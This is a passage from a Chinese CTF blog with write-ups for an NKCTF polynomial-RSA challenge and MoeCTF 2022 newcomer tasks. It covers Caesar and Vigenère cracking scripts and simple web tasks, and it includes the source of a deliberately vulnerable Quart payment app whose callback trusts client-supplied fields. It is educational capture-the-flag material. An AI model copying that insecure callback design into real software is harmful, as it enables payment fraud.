#N:24096*y^93 + 38785*y^92 + 17489*y^91 + 9067*y^90 + 1034*y^89 + 6534*y^88 + 35818*y^87 + 22046*y^86 + 12887*y^85 + 445*y^84 + 26322*y^83 + 37045*y^82 + 4486*y^81 + 3503*y^80 + 1184*y^79 + 38471*y^78 + 8012*y^77 + 36561*y^76 + 19429*y^75 + 35227*y^74 + 10813*y^73 + 26341*y^72 + 29474*y^71 + 2059*y^70 + 16068*y^69 + 31597*y^68 + 14685*y^67 + 9266*y^66 + 31019*y^65 + 6171*y^64 + 385*y^63 + 28986*y^62 + 9912*y^61 + 10632*y^60 + 33741*y^59 + 12634*y^58 + 21179*y^57 + 35548*y^56 + 17894*y^55 + 7152*y^54 + 9440*y^53 + 4004*y^52 + 2600*y^51 + 12281*y^50 + 22*y^49 + 17314*y^48 + 32694*y^47 + 7693*y^46 + 6567*y^45 + 19897*y^44 + 27329*y^43 + 8799*y^42 + 36348*y^41 + 33963*y^40 + 23730*y^39 + 27685*y^38 + 29037*y^37 + 14622*y^36 + 29608*y^35 + 39588*y^34 + 23294*y^33 + 757*y^32 + 20140*y^31 + 19511*y^30 + 1469*y^29 + 3898*y^28 + 6630*y^27 + 19610*y^26 + 11631*y^25 + 7188*y^24 + 11683*y^23 + 35611*y^22 + 37286*y^21 + 32139*y^20 + 20296*y^19 + 36426*y^18 + 25340*y^17 + 36204*y^16 + 37787*y^15 + 31256*y^14 + 505*y^13 + 27508*y^12 + 20885*y^11 + 32037*y^10 + 31236*y^9 + 7929*y^8 + 27195*y^7 + 28980*y^6 + 11863*y^5 + 16025*y^4 + 16389*y^3 + 570*y^2 + 36547*y + 10451
#C:3552*x^92 + 6082*x^91 + 25295*x^90 + 35988*x^89 + 26052*x^88 + 16987*x^87 + 12854*x^86 + 25117*x^85 + 25800*x^84 + 30297*x^83 + 5589*x^82 + 23233*x^81 + 14449*x^80 + 4712*x^79 + 35719*x^78 + 1696*x^77 + 35653*x^76 + 13995*x^75 + 13715*x^74 + 4578*x^73 + 37366*x^72 + 25260*x^71 + 28865*x^70 + 36120*x^69 + 7047*x^68 + 10497*x^67 + 19160*x^66 + 17939*x^65 + 14850*x^64 + 6705*x^63 + 17805*x^62 + 30083*x^61 + 2400*x^60 + 10685*x^59 + 15272*x^58 + 2225*x^57 + 13194*x^56 + 14251*x^55 + 31016*x^54 + 10189*x^53 + 35040*x^52 + 7042*x^51 + 29206*x^50 + 39363*x^49 + 32608*x^48 + 38614*x^47 + 5528*x^46 + 20119*x^45 + 13439*x^44 + 25468*x^43 + 30056*x^42 + 19720*x^41 + 21808*x^40 + 3712*x^39 + 25243*x^38 + 10606*x^37 + 16247*x^36 + 36106*x^35 + 17287*x^34 + 36276*x^33 + 1407*x^32 + 28839*x^31 + 8459*x^30 + 38863*x^29 + 435*x^28 + 913*x^27 + 36619*x^26 + 15572*x^25 + 9363*x^24 + 36837*x^23 + 17925*x^22 + 38567*x^21 + 38709*x^20 + 13582*x^19 + 35038*x^18 + 31121*x^17 + 8933*x^16 + 1666*x^15 + 21940*x^14 + 25585*x^13 + 840*x^12 + 21938*x^11 + 20143*x^10 + 28507*x^9 + 5947*x^8 + 20289*x^7 + 32196*x^6 + 924*x^5 + 370*x^4 + 14849*x^3 + 10780*x^2 + 14035*x + 15327</code></pre>
<p>sagemath库直接一把梭</p>
<p>推导一下公式可以得到</p>
<p>s = (P<strong>p.degree()-1)*(P</strong>q.degree()-1)</p>
<p>d = inverse_mod(e,s)</p>
<p>exp如下</p>
<pre><code class="hljs plaintext">from binascii import *

P = 40031
R.&lt;y&gt; = PolynomialRing(GF(P))
N =  24096*y^93 + 38785*y^92 + 17489*y^91 + 9067*y^90 + 1034*y^89 + 6534*y^88 + 35818*y^87 + 22046*y^86 + 12887*y^85 + 445*y^84 + 26322*y^83 + 37045*y^82 + 4486*y^81 + 3503*y^80 + 1184*y^79 + 38471*y^78 + 8012*y^77 + 36561*y^76 + 19429*y^75 + 35227*y^74 + 10813*y^73 + 26341*y^72 + 29474*y^71 + 2059*y^70 + 16068*y^69 + 31597*y^68 + 14685*y^67 + 9266*y^66 + 31019*y^65 + 6171*y^64 + 385*y^63 + 28986*y^62 + 9912*y^61 + 10632*y^60 + 33741*y^59 + 12634*y^58 + 21179*y^57 + 35548*y^56 + 17894*y^55 + 7152*y^54 + 9440*y^53 + 4004*y^52 + 2600*y^51 + 12281*y^50 + 22*y^49 + 17314*y^48 + 32694*y^47 + 7693*y^46 + 6567*y^45 + 19897*y^44 + 27329*y^43 + 8799*y^42 + 36348*y^41 + 33963*y^40 + 23730*y^39 + 27685*y^38 + 29037*y^37 + 14622*y^36 + 29608*y^35 + 39588*y^34 + 23294*y^33 + 757*y^32 + 20140*y^31 + 19511*y^30 + 1469*y^29 + 3898*y^28 + 6630*y^27 + 19610*y^26 + 11631*y^25 + 7188*y^24 + 11683*y^23 + 35611*y^22 + 37286*y^21 + 32139*y^20 + 20296*y^19 + 36426*y^18 + 25340*y^17 + 36204*y^16 + 37787*y^15 + 31256*y^14 + 505*y^13 + 27508*y^12 + 20885*y^11 + 32037*y^10 + 31236*y^9 + 7929*y^8 + 27195*y^7 + 28980*y^6 + 11863*y^5 + 16025*y^4 + 16389*y^3 + 570*y^2 + 36547*y + 10451
S.&lt;x&gt; = R.quotient(N)
C =  3552*x^92 + 6082*x^91 + 25295*x^90 + 35988*x^89 + 26052*x^88 + 16987*x^87 + 12854*x^86 + 25117*x^85 + 25800*x^84 + 30297*x^83 + 5589*x^82 + 23233*x^81 + 14449*x^80 + 4712*x^79 + 35719*x^78 + 1696*x^77 + 35653*x^76 + 13995*x^75 + 13715*x^74 + 4578*x^73 + 37366*x^72 + 25260*x^71 + 28865*x^70 + 36120*x^69 + 7047*x^68 + 10497*x^67 + 19160*x^66 + 17939*x^65 + 14850*x^64 + 6705*x^63 + 17805*x^62 + 30083*x^61 + 2400*x^60 + 10685*x^59 + 15272*x^58 + 2225*x^57 + 13194*x^56 + 14251*x^55 + 31016*x^54 + 10189*x^53 + 35040*x^52 + 7042*x^51 + 29206*x^50 + 39363*x^49 + 32608*x^48 + 38614*x^47 + 5528*x^46 + 20119*x^45 + 13439*x^44 + 25468*x^43 + 30056*x^42 + 19720*x^41 + 21808*x^40 + 3712*x^39 + 25243*x^38 + 10606*x^37 + 16247*x^36 + 36106*x^35 + 17287*x^34 + 36276*x^33 + 1407*x^32 + 28839*x^31 + 8459*x^30 + 38863*x^29 + 435*x^28 + 913*x^27 + 36619*x^26 + 15572*x^25 + 9363*x^24 + 36837*x^23 + 17925*x^22 + 38567*x^21 + 38709*x^20 + 13582*x^19 + 35038*x^18 + 31121*x^17 + 8933*x^16 + 1666*x^15 + 21940*x^14 + 25585*x^13 + 840*x^12 + 21938*x^11 + 20143*x^10 + 28507*x^9 + 5947*x^8 + 20289*x^7 + 32196*x^6 + 924*x^5 + 370*x^4 + 14849*x^3 + 10780*x^2 + 14035*x + 15327

p,q = N.factor()
p,q = p[0],q[0]
s = (P**p.degree()-1)*(P**q.degree()-1)
e = 65537
d = inverse_mod(e,s)

M = C^d
print (&quot;&quot;.join([chr(c) for c in M.list()]))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230325170107620.png?x-oss-process=hzy" alt="image-20230325170107620"></p>
<p>得到flag</p>
<pre><code class="hljs plaintext">NKCTF&#123;We_HaV3_n0th1ng_But_dr3amS&#125;</code></pre>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022Moectf</title>
    <url>/2022/10/27/Moectf%E8%A5%BF%E7%94%B5CTF%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291834248.png?x-oss-process=hzy" alt="image-20220929183418047"></p>
<span id="more"></span>
<p>Moectf西电CTF新生赛</p>
<h1 id="前言">前言</h1>
<p>很适合新手，难度有阶梯，边学边实战，在全菜的路上越走越远</p>
<h1 id="古典密码">古典密码</h1>
<h2 id="abcdefg~">ABCDEFG~</h2>
<blockquote>
<p>题目描述：字母儿歌你会倒着唱吗？（大写）</p>
</blockquote>
<p>密文是</p>
<pre><code class="hljs plaintext">moectf&#123;18 24 26 13 08 18 13 20 26 15 11 19 26 25 22 07 08 12 13 20&#125;</code></pre>
<p>字母歌，倒着唱，所以字母表倒着排序</p>
<pre><code class="hljs plaintext">26A、25B、24C、23D、22E、21F、20G、19H、18I、17J、16K、15L、14M、13N、12O、11P、10Q、9R、8S、7T、6U、5V、4W、3X、2Y、1Z</code></pre>
<p>得到flag</p>
<p>moectf{ICANSINGALPHABETSONG}</p>
<h2 id="小小凯撒">小小凯撒</h2>
<blockquote>
<p>题目描述：好像大小写都有呢。</p>
<p>提示：<br>
&lt;0&gt; 尝试若干次不正确的话，不妨换个思路？关注一下字母表，建议自己写脚本<br>
&lt;1&gt; 解出flag之后请手动加上moectf{}<br>
&lt;2&gt; 每个单词首字母大写，其余小写，无分隔</p>
</blockquote>
<p>密文是</p>
<pre><code class="hljs plaintext">kqEftuEUEftqOADDqoFRxmsOAzsDmFGxmFuAzE</code></pre>
<p>脚本如下</p>
<pre><code class="hljs plaintext">def casearDecrypt(ciphertext, source_char, destination_char, list_all): 
    
    if list_all == True:
        for offset in range(1, 27):
            convertChar(offset)
    else:
        offset =  ord(destination_char) - ord(source_char)
        convertChar(offset)
 
def convertChar(offset):
    chars = &quot;abcdefghijklmnopqrstuvwxyz&quot;
    for char in ciphertext:
         
        is_upper_flag = 0
        if char.isupper():
            char = char.lower()
            is_upper_flag = 1
         
        if char not in chars:
            outputChar(is_upper_flag, char)
            continue
         
        tempchar_ascii = ord(char) + offset
        tempchar =chr(tempchar_ascii)
        if tempchar not in chars:
            if offset &lt; 0:
                tempchar_ascii += len(chars)
            else:
                tempchar_ascii -= len(chars)
        tempchar = chr(tempchar_ascii)
        outputChar(is_upper_flag, tempchar)
    print(&quot;&quot;)
 
def outputChar(is_upper_flag, char):
    
    if is_upper_flag == 1:
        print(char.upper(), end=&quot;&quot;)
    else:
        print(char, end=&quot;&quot;)
 
ciphertext = input(&quot;Please input ciphertext:\n&quot;)
while True:
    operation = input(&quot;List all results?y/n:&quot;)
    if operation == &#x27;y&#x27; or operation == &#x27;Y&#x27;:
        casearDecrypt(ciphertext, &#x27;&#x27;, &#x27;&#x27;, True)
        break
    elif operation == &#x27;n&#x27; or operation == &#x27;N&#x27;:
        des_char = input(&quot;Please input destination_char:\n&quot;)
        sors_char = input(&quot;Please input source_char:\n&quot;)
        casearDecrypt(ciphertext, sors_char, des_char, False)
        break
    else:
        print(&quot;Input error! Please input y/n:&quot;)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271117166.png?x-oss-process=hzy" alt="image-20220827111722524"></p>
<p>moectf{yeSthiSIStheCORRecTFlagCOngRaTUlaTiOnS}</p>
<p>所以flag为moectf{YesThisIsTheCorrectFlagCongratulations}</p>
<h2 id="凯撒变异了">凯撒变异了</h2>
<blockquote>
<p>题目描述：神秘的变异人凯撒来自track曾经的出发地：114514市<br>
提示：<br>
&lt;0&gt; 请先完成小小凯撒（字母表小写+大写52位<br>
&lt;1&gt; flag无字母以外的其他字符</p>
</blockquote>
<p>密文是</p>
<pre><code class="hljs plaintext">ZpyLfxGmelDeftewJwFbwDGssZszbliileadaa</code></pre>
<p>这里浅浅学一下，毕竟没咋接触过密码学，还是有好多地方不会的</p>
<p>搜了一下，所谓变异凯撒就是偏移量改变了，需要自己看一下偏移量</p>
<pre><code class="hljs plaintext">ZpyLfxGmelDeftewJwFbwDGssZszbliileadaa  // 抽开始的Zpy这三个吧，对应的应该是moe
Z，p，y对应的ascll为90，112，121，moe对应ascll为109，111，101，之间相差貌似不是一致的，那应该不是这个关系
abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ
Z-&gt;m  13
p-&gt;o</code></pre>
<p>暂时没思路</p>
<h2 id="vigenère">Vigenère</h2>
<blockquote>
<p>题目描述：维基百科说： 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”（法语：le chiffre indéchiffrable）。  那么聪明的你能够破解嘛？<br>
提示：<br>
&lt;0&gt;  flag格式：全部小写，下划线分隔</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208280913072.png?x-oss-process=hzy" alt="image-20220828091325926"></p>
<p>就是维吉尼亚加密，难点就是得爆破key</p>
<p>刚开始找到的脚本爆破密钥但是发现解出来不全，脚本也贴一下吧</p>
<pre><code class="hljs plaintext">&#x27;&#x27;&#x27;维吉尼亚破解&#x27;&#x27;&#x27;
import numpy as np
import wordninja

def alpha(cipher): #预处理,去掉空格以及回车 
    c = &#x27;&#x27;
    for i in range(len(cipher)):
        if(cipher[i].isalpha()):
            c += cipher[i]
    return c

def count_IC(cipher): #给定字符串计算其重合指数 
    count = [0 for i in range(26)]
    L = len(cipher)
    IC = 0.0
    for i in range(len(cipher)):
        if(cipher[i].isupper()):
            count[ord(cipher[i])-ord(&#x27;A&#x27;)] += 1
        elif(cipher[i].islower()):
            count[ord(cipher[i])-ord(&#x27;a&#x27;)] += 1
    for i in range(26):
        IC += (count[i]*(count[i]-1))/(L*(L-1))
    return IC

def count_key_len(cipher,key_len): #对字符串按输入个数进行分组，计算每一组的IC值返回平均值
    N = [&#x27;&#x27; for i in range(key_len)]
    IC = [0 for i in range(key_len)]
    for i in range(len(cipher)):
        m = i % key_len
        N[m] += cipher[i]
    for i in range(key_len):
        IC[i] = count_IC(N[i])
    #print(IC)
    print(&quot;长度为%d时,平均重合指数为%.5f&quot; % (key_len,np.mean(IC)))
    return np.mean(IC)    

def length(cipher): #遍历确定最有可能的密钥长度返回密钥长度 
    key_len = 0
    mins = 100
    aver = 0.0
    for i in range(1,10):
        k = count_key_len(cipher,i)
        if(abs(k-0.065)&lt;mins):
            mins = abs(k-0.065)
            key_len = i
            aver = k
    print(&quot;密钥长度为%d,此时重合指数每组的平均值为%.5f&quot; % (key_len,aver))
    return key_len
    
def count_MIC(c1,c2,n): #n=k1-k2为偏移量,计算c1,c2互重合指数MIC
    count_1 = [0 for i in range(26)]
    count_2 = [0 for i in range(26)]
    L_1 = len(c1)
    L_2 = len(c2)
    MIC = 0
    for i in range(L_1):
        if(c1[i].isupper()):
            count_1[ord(c1[i])-ord(&#x27;A&#x27;)] += 1
        elif(c1[i].islower()):
            count_1[ord(c1[i])-ord(&#x27;a&#x27;)] += 1         
    for i in range(L_2):
        if(c2[i].isupper()):   
            count_2[(ord(c2[i])-ord(&#x27;A&#x27;)+n+26)% 26] += 1
        elif(c2[i].islower()):
            count_2[(ord(c2[i])-ord(&#x27;a&#x27;)+n+26)% 26] += 1   
    for i in range(26):
        MIC += count_1[i]*count_2[i]/(L_1*L_2)
    return MIC

def count_n(c1,c2): #确定两个子串最优的相对偏移量n=k1-k2
    n = 0
    mins = 100
    k = [0.0 for i in range(26)]
    for i in range(26):
        k[i] = count_MIC(c1,c2,i)
        #print(i,k[i])  
        if(abs(k[i]-0.065)&lt;mins):
            mins = abs(k[i]-0.065)
            n = i      
    return n
        
def  group_k(cipher,key_len):#完成分组操作并计算每一组与第一组的最优相对偏移量并返回
    N = [&#x27;&#x27; for i in range(key_len)]
    MIC = [0 for i in range(key_len)]
    s = [0 for i in range(key_len)]
    for i in range(len(cipher)): #对密文进行分组 
        m = i % key_len
        N[m] += cipher[i] 
    for i in range(1,key_len):  #计算与第一组之间的相对偏移量 
        s[i] = count_n(N[0],N[i])  # s[i] = k1-k(i+1) 
        MIC[i] = count_MIC(N[0],N[i],s[i])  # MIC[i] = MIC(1,i+1)
        print(&quot;第1组和第%d组之间偏移为%d时，互重合指数为%.5f&quot; % (i+1,s[i],MIC[i]))
    return s    

def miyao(key_len,s,k):  #k为第一个子串的移位，输出密钥并返回密钥所有字母的下标
    mi = [&#x27;&#x27; for i in range(key_len)] 
    for i in range(key_len):
        s[i] = -s[i]+k   #k2=k1-n
        mi[i] = chr((s[i]+26) % 26 + ord(&#x27;a&#x27;))
    print(&quot;第一个偏移量为%d,密钥为%s时&quot; % (k,mi))
    return s

def the_end(cipher,key_len,s):#输入密文密钥返回明文结果 
    plain =&#x27;&#x27; 
    i = 0 
    while( i &lt; len(cipher)):
        for j in range(key_len):
            if(cipher[i].isupper()):
                plain += chr((ord(cipher[i])-ord(&#x27;A&#x27;)-s[j]+26) % 26 + ord(&#x27;A&#x27;))
            else:
                plain += chr((ord(cipher[i])-ord(&#x27;a&#x27;)-s[j]+26) % 26 + ord(&#x27;a&#x27;))
            i+=1
            if(i == len(cipher)):
                break 
   # print(plain) 
    return plain
             
if __name__ == &quot;__main__&quot;:
    fp = open(&quot;附件.txt&quot;,&quot;r&quot;)
    cipher = &#x27;&#x27; 
    for i in fp.readlines():
        cipher = cipher + i    
    fp.close()
    cipher = alpha(cipher)
    key_len = length(cipher)
    s = group_k(cipher,key_len)
    m = s.copy()
    for k in range(26):
        s = m.copy() 
        s = miyao(key_len,s,k)
        plain = the_end(cipher,key_len,s)
        print(plain[0:20]) #输出部分明文确定偏移量k1
    print(&quot;参考输出，请输入第一个子串的偏移量:&quot;,end=&#x27;&#x27;)
    k = int(input())
    m = miyao(key_len,m,k)
    plain = the_end(cipher,key_len,m)

    &#x27;&#x27;&#x27;对英文文本进行分词&#x27;&#x27;&#x27;
    word = wordninja.split(plain)
    plain = &#x27;&#x27;
    for i in range(len(word)):
        plain += word[i]
        plain += &#x27; &#x27;
    print(&quot;明文为\n&quot;+plain)
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208280924192.png?x-oss-process=hzy" alt="image-20220828092436088"></p>
<p>通过脚本其实就可以确定偏移量是19，密钥是tfdvsjuz了</p>
<p>然后找个在线解密的，就可以解密了，我找到个可以在线爆破密钥的网站又爆破了一次</p>
<p><a href="https://guballa.de/vigenere-solver">Vigenere Solver - www.guballa.de</a></p>
<pre><code class="hljs plaintext">information security, sometimes shortened to infosec, is the practice of protecting information by mitigating information risks. it is part of information risk management. it typically involves preventing or reducing the probability of unauthorized/inappropriate access to data, or the unlawful use, disclosure, disruption, deletion, corruption, modification, inspection, recording, or devaluation of information. it also involves actions intended to reduce the adverse impacts of such incidents. protected information may take any form, e.g. electronic or physical, tangible (e.g. paperwork) or intangible (e.g. knowledge). information security&#x27;s primary focus is the balanced protection of the confidentiality, integrity, and availability of data (also known as the cia triad) while maintaining a focus on efficient policy implementation, all without hampering organization productivity. this is largely achieved through a structured risk management process that involves:
1. identifying information and related assets, plus potential threats, vulnerabilities, and impacts;
2. evaluating the risks
3. deciding how to address or treat the risks i.e. to avoid, mitigate, share or accept them
4. where risk mitigation is required, selecting or designing appropriate security controls and implementing them
5. monitoring the activities, making adjustments as necessary to address any issues, changes and improvement opportunities
6. i won&#x27;t tell you that the flag is moectf attacking the vigenere cipher is interesting
to standardize this discipline, academics and professionals collaborate to offer guidance, policies, and industry standards on password, antivirus software, firewall, encryption software, legal liability, security awareness and training, and so forth. this standardization may be further driven by a wide variety of laws and regulations that affect how data is accessed, processed, stored, transferred and destroyed. however, the implementation of any standards and guidance within an entity may have limited effect if a culture of continual improvement isn&#x27;t adopted.</code></pre>
<p>moectf{attacking_the_vigenere_cipher_is_interesting}</p>
<h1 id="计算机技术基础">计算机技术基础</h1>
<h2 id="run-me">run me</h2>
<blockquote>
<p>题目描述：下载文件，双击运行得flag~ 但是我的程序好像会闪退欸，能不能想个办法保留一下它的输出？比如用CMD来运行它试试？ 如果你不知道什么是CMD，可以尝试使用搜索引擎来学习，加油吧(&gt; &lt;)</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262132099.png?x-oss-process=hzy" alt="image-20220826213225038"></p>
<p>实在人啊，真的直接就cmd了</p>
<p>moectf{run_me_to_get_the_flag}</p>
<h2 id="ccccc">CCCCC</h2>
<blockquote>
<p>题目描述：C语言是学习计算机基础中的基础,也是计算机第一学期的必修课。本题你需要配置一个能够编译运行C语言程序的环境,并运行题目给出的代码来获取flag。 By the way: 如果你看不懂这段代码,仅仅只是运行得到了flag,后面的题做起来会有一点困难奥。</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262135972.png?x-oss-process=hzy" alt="image-20220826213511903"></p>
<p>就是给个程序，跑就行了</p>
<p>moectf{0h_y0u_can_run_a_C_pr0gram!}</p>
<h2 id="python">Python</h2>
<p>跟上题一样，跑就完了</p>
<p>moectf{Python_YYDS!}</p>
<h2 id="run-me-2">run me 2</h2>
<blockquote>
<p>题目描述：下载文件，运行得flag~ 诶诶出了点小问题，好像不能运行？！因为这个程序是Linux操作系统下的可执行文件，不再是 Windows了。 请尝试配置一个Linux环境（虚拟机或者WSL）来运行它。</p>
</blockquote>
<p>跑就完了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262140946.png?x-oss-process=hzy" alt="image-20220826214028903"></p>
<p>moectf{run_m3_t0_g3t_th3_f1ag}</p>
<h1 id="web审计与渗透测试">Web审计与渗透测试</h1>
<h2 id="web安全之入门指北">web安全之入门指北</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262142331.png?x-oss-process=hzy" alt="image-20220826214235285"></p>
<p>moeCTF{g3t_aUthor1zed_bef0r3_PENTEST!}</p>
<h2 id="ezhtml">ezhtml</h2>
<blockquote>
<p>题目描述：cyxq高考并不是很理想，你能帮他把成绩改到600分以上用来截图吗 题目地址：82.156.5.200:1038</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262144869.png?x-oss-process=hzy" alt="image-20220826214411779"></p>
<p>直接看js文件</p>
<pre><code class="hljs plaintext">moectf&#123;W3lc0me_to_theWorldOf_Web!&#125;</code></pre>
<h2 id="god_of_aim">God_of_Aim</h2>
<blockquote>
<p>题目描述：Ghost最近沉迷FPS，你能打通这个小游戏吗？题目地址：82.156.5.200:1039</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262146597.png?x-oss-process=hzy" alt="image-20220826214641538"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262147232.png?x-oss-process=hzy" alt="image-20220826214705189"></p>
<p>玩一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262231620.png?x-oss-process=hzy" alt="image-20220826223156539"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262238621.png?x-oss-process=hzy" alt="image-20220826223814550"></p>
<p>js泄露，hex转str即可</p>
<p>moectf{Oh_you_can_a1m_and_H4ck_Javascript}</p>
<h2 id="支付系统">支付系统</h2>
<blockquote>
<p>题目描述：只要100块钱就能买到flag呢</p>
</blockquote>
<p>题目如下</p>
<pre><code class="hljs plaintext">import os
import uuid
from quart import Quart, render_template, redirect, jsonify, request, session
from hashlib import pbkdf2_hmac
from enum import IntEnum
from tortoise import fields
from tortoise.models import Model
from tortoise.contrib.quart import register_tortoise
from httpx import AsyncClient

app = Quart(__name__)
app.secret_key = os.urandom(16)


class TransactionStatus(IntEnum):
    SUCCESS = 0
    PENDING = 1
    FAILED = 2
    TIMEOUT = 3


class Transaction(Model):
    id = fields.IntField(pk=True)
    user = fields.UUIDField()
    amount = fields.IntField()
    status = fields.IntEnumField(TransactionStatus)
    desc = fields.TextField()
    hash = fields.CharField(64, null=True)

    def __init__(self, **kwargs):
        super().__init__()
        for k, v in kwargs.items():
            self.__setattr__(k, v)


async def do_callback(transaction: Transaction):
    async with AsyncClient() as ses:
        transaction.status = int(TransactionStatus.FAILED)
        data = (
            f&#x27;&#123;transaction.id&#125;&#x27;
            f&#x27;&#123;transaction.user&#125;&#x27;
            f&#x27;&#123;transaction.amount&#125;&#x27;
            f&#x27;&#123;transaction.status&#125;&#x27;
            f&#x27;&#123;transaction.desc&#125;&#x27;
        ).encode()
        await ses.post(f&#x27;http://localhost:8000/callback&#x27;, data=&#123;
            &#x27;id&#x27;: transaction.id,
            &#x27;user&#x27;: transaction.user,
            &#x27;amount&#x27;: transaction.amount,
            &#x27;desc&#x27;: transaction.desc,
            &#x27;status&#x27;: transaction.status,
            &#x27;hash&#x27;: pbkdf2_hmac(&#x27;sha256&#x27;, data, app.secret_key, 2**20).hex()
        &#125;)


@app.before_request
async def create_session():
    if &#x27;uid&#x27; not in session:
        session[&#x27;uid&#x27;] = str(uuid.uuid4())
    session[&#x27;balance&#x27;] = 0
    for tr in await Transaction.filter(user=session[&#x27;uid&#x27;]).all():
        if tr.status == TransactionStatus.SUCCESS:
            session[&#x27;balance&#x27;] += tr.amount


@app.route(&#x27;/pay&#x27;)
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get(&#x27;amount&#x27;),
        desc=request.args.get(&#x27;desc&#x27;),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get(&#x27;uid&#x27;))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f&#x27;/transaction?id=&#123;transaction.id&#125;&#x27;)


@app.route(&#x27;/callback&#x27;, methods=[&#x27;POST&#x27;])
async def callback():
    form = dict(await request.form)
    data = (
        f&#x27;&#123;form.get(&quot;id&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;user&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;amount&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;status&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;desc&quot;)&#125;&#x27;
    ).encode()
    k = pbkdf2_hmac(&#x27;sha256&#x27;, data, app.secret_key, 2**20).hex()
    tr = await Transaction.get(id=int(form.pop(&#x27;id&#x27;)))
    if k != form.get(&quot;hash&quot;) or int(form.pop(&#x27;amount&#x27;)) != tr.amount:
        return &#x27;403&#x27;
    form[&#x27;status&#x27;] = TransactionStatus(int(form.pop(&#x27;status&#x27;)))
    tr.update_from_dict(form)
    await tr.save()
    return &#x27;ok&#x27;


@app.route(&#x27;/transaction&#x27;)
async def transaction():
    if &#x27;id&#x27; not in request.args:
        return &#x27;404&#x27;
    transaction = await Transaction.get(id=request.args.get(&#x27;id&#x27;))
    return await render_template(&#x27;receipt.html&#x27;, transaction=transaction)


@app.route(&#x27;/flag&#x27;)
async def flag():
    return await render_template(
        &#x27;flag.html&#x27;,
        balance=session[&#x27;balance&#x27;],
        flag=os.getenv(&#x27;FLAG&#x27;),
    )


@app.route(&#x27;/&#x27;)
@app.route(&#x27;/index.html&#x27;)
async def index():
    with open(__file__) as f:
        return await render_template(&#x27;source-highlight.html&#x27;, code=f.read())


register_tortoise(
    app,
    db_url=&quot;sqlite://./data.db&quot;,
    modules=&#123;&quot;models&quot;: [__name__]&#125;,
    generate_schemas=True,
)

if __name__ == &#x27;__main__&#x27;:
    app.run()</code></pre>
<p>这个一直没啥思路，中间出题人又改了题目</p>
<blockquote>
<p>&lt;0&gt; [8.29 15:30] 修改了题目，去除了amount校验</p>
</blockquote>
<pre><code class="hljs plaintext">import os
import uuid
from quart import Quart, render_template, redirect, jsonify, request, session
from hashlib import pbkdf2_hmac
from enum import IntEnum
from tortoise import fields
from tortoise.models import Model
from tortoise.contrib.quart import register_tortoise
from httpx import AsyncClient

app = Quart(__name__)
app.secret_key = os.urandom(16)


class TransactionStatus(IntEnum):   #实现事务状态功能
    SUCCESS = 0
    PENDING = 1  # pending
    FAILED = 2
    TIMEOUT = 3


class Transaction(Model):      # 交易功能实现
    id = fields.IntField(pk=True)
    user = fields.UUIDField()
    amount = fields.IntField()
    status = fields.IntEnumField(TransactionStatus)
    desc = fields.TextField()
    hash = fields.CharField(64, null=True)

    def __init__(self, **kwargs):
        super().__init__()
        for k, v in kwargs.items():
            self.__setattr__(k, v)


async def do_callback(transaction: Transaction):   # 回调函数
    async with AsyncClient() as ses:
        transaction.status = int(TransactionStatus.FAILED)
        data = (
            f&#x27;&#123;transaction.id&#125;&#x27;
            f&#x27;&#123;transaction.user&#125;&#x27;
            f&#x27;&#123;transaction.amount&#125;&#x27;
            f&#x27;&#123;transaction.status&#125;&#x27;
            f&#x27;&#123;transaction.desc&#125;&#x27;
        ).encode()
        await ses.post(f&#x27;http://localhost:8000/callback&#x27;, data=&#123;
            &#x27;id&#x27;: transaction.id,
            &#x27;user&#x27;: transaction.user,
            &#x27;amount&#x27;: transaction.amount,
            &#x27;desc&#x27;: transaction.desc,
            &#x27;status&#x27;: transaction.status,
            &#x27;hash&#x27;: pbkdf2_hmac(&#x27;sha256&#x27;, data, app.secret_key, 2**20).hex()
        &#125;)


@app.before_request
async def create_session():
    if &#x27;uid&#x27; not in session:       # 调用数据库查寻uid
        session[&#x27;uid&#x27;] = str(uuid.uuid4())
    session[&#x27;balance&#x27;] = 0
    for tr in await Transaction.filter(user=session[&#x27;uid&#x27;]).all():
        if tr.status == TransactionStatus.SUCCESS:
            session[&#x27;balance&#x27;] += tr.amount    # 关键点，找到对应用户即可实现加钱功能


@app.route(&#x27;/pay&#x27;)    # 实现支付功能
async def pay():
    transaction = await Transaction.create(
        amount=request.args.get(&#x27;amount&#x27;),
        desc=request.args.get(&#x27;desc&#x27;),
        status=TransactionStatus.PENDING,
        user=uuid.UUID(session.get(&#x27;uid&#x27;))
    )
    app.add_background_task(do_callback, transaction)
    return redirect(f&#x27;/transaction?id=&#123;transaction.id&#125;&#x27;)

 
